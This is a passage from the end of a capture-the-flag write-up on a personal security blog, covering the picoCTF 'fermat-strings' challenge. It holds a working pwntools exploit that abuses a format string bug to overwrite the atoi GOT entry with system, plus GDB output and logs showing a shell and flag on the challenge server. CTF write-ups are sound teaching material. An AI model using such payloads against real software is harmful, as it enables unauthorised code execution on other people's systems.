<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>The first thing to notice is the use of the AND operators to get the last 2 bytes of the address of <code>system</code>. And then the modulo operator to wrap around <code>0xffff</code> if the operation was negative. After that we use <code>%11$hn</code>.</p><p>To overwrite the next 2 bytes, we need to put the address of the GOT entry for <code>atoi</code> but plus 2 (because we want to write in the next 2 bytes). And hence, we must use <code>%12$hn</code>. For now, let&rsquo;s leave the second part blank (only <code>%12$hn</code>).</p><p>We attach GDB to the process and show the GOT entries:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  ‚Üí  0x7f70473075a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  ‚Üí  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  ‚Üí  0x7f704730ec50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  ‚Üí  0x7f70472e4e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  ‚Üí  0x7f70472e4ee0</span>
[0x601040] <span class="code-dark-yellow">pow@GLIBC_2.2.5  ‚Üí  0x400837</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  ‚Üí  0x7f70474067b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  ‚Üí  0x7f7047391130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  ‚Üí  0x7f7054105410</span>
</code></pre></div><p>Notice how the last 2 bytes were overwritten correctly (at least the last 3 hexadecimal digits match with <code>410</code>, which is the offset of <code>system</code>). And also, we must take into account that the next 2 bytes have the same value as the last 2 bytes (<code>5410</code>).</p><p>Knowing this, we can compute the number of bytes to write in order to place the correct number in that position:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">((</span><span class="mtk1">system_addr</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$hn'</span>

<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(((</span><span class="mtk1">system_addr</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk6">16</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">system_addr</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>  

<span class="mtk1">payload_b</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%12$hn'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>And everything works smoothly locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 547640  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7f05651e4730
[<span class="code-green">+</span>] Leaked puts() address: 0x7f05652245a0
[<span class="code-green">+</span>] Glibc base address: 0x7f056519d000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s see if it works remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mars.picoctf.net 31929
[<span class="code-green">+</span>] Opening connection to mars.picoctf.net on port 31929: Done  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7fc3974da730
[<span class="code-green">+</span>] Leaked puts() address: 0x7fc39751a5a0
[<span class="code-green">+</span>] Glibc base address: 0x7fc397493000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
run
<span class="code-red">$</span> cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/CTF-scripts/blob/main/picoCTF/Binary%20Exploitation/fermat-strings/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#static-code-analysis">Static code analysis</a></li><li><a href="#format-string-vulnerability">Format String vulnerability</a></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#manual-exploitation">Manual exploitation</a></li><li><a href="#obtaining-memory-leaks">Obtaining memory leaks</a></li><li><a href="#got-overwrite">GOT overwrite</a></li><li><a href="#finding-the-remote-glibc-version">Finding the remote Glibc version</a></li><li><a href="#fixing-the-exploit">Fixing the exploit</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>